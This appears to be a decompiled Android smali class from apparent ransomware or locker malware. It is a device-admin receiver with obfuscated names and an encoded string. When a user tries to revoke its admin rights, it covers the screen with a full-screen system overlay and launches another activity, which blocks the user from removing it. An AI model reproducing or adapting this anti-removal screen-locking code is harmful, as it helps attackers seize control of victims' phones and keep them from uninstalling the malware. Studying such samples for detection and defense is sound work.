.class public Lcompse/refact/st/upsssss/Crypt/CriptActivity;
.super Landroid/app/admin/DeviceAdminReceiver;


# instance fields
.field private fsafsdfsfsdfsfsdfsd:Landroid/view/View;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/admin/DeviceAdminReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;
    .locals 5

    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    invoke-direct {v1}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    const/4 v0, -0x3

    const v2, 0x40008

    iput v2, v1, Landroid/view/WindowManager$LayoutParams;->flags:I

    iput v0, v1, Landroid/view/WindowManager$LayoutParams;->format:I

    invoke-static {p1}, Landroid/view/LayoutInflater;->from(Landroid/content/Context;)Landroid/view/LayoutInflater;

    move-result-object v0

    const v2, 0x7f040002

    const/4 v3, 0x0

    invoke-virtual {v0, v2, v3}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v0

    const v2, 0x7f080003

    invoke-virtual {v0, v2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lcompse/refact/st/upsssss/Crypt/CriptActivity;->fsafsdfsfsdfsfsdfsd:Landroid/view/View;

    iget-object v0, p0, Lcompse/refact/st/upsssss/Crypt/CriptActivity;->fsafsdfsfsdfsfsdfsd:Landroid/view/View;

    invoke-virtual {v0}, Landroid/view/View;->getParent()Landroid/view/ViewParent;

    move-result-object v0

    check-cast v0, Landroid/view/ViewGroup;

    if-eqz v0, :cond_0

    iget-object v2, p0, Lcompse/refact/st/upsssss/Crypt/CriptActivity;->fsafsdfsfsdfsfsdfsd:Landroid/view/View;

    invoke-virtual {v0, v2}, Landroid/view/ViewGroup;->removeView(Landroid/view/View;)V

    :cond_0
    const/4 v0, -0x1

    const/16 v2, 0x33

    const/16 v3, 0x7da

    const/4 v4, 0x1

    iput v4, v1, Landroid/view/WindowManager$LayoutParams;->format:I

    iput v3, v1, Landroid/view/WindowManager$LayoutParams;->type:I

    iput v2, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    iput v0, v1, Landroid/view/WindowManager$LayoutParams;->width:I

    iput v0, v1, Landroid/view/WindowManager$LayoutParams;->height:I

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v2, "9\u0000 \r!\u001e"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iget-object v2, p0, Lcompse/refact/st/upsssss/Crypt/CriptActivity;->fsafsdfsfsdfsfsdfsd:Landroid/view/View;

    invoke-interface {v0, v2, v1}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcompse/refact/st/upsssss/Crypt/CriptActivity$mainActivity;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, ""

    const/high16 v2, 0x10000000

    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-object v1
.end method

.method public onDisabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    return-void
.end method

.method public onEnabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    return-void
.end method
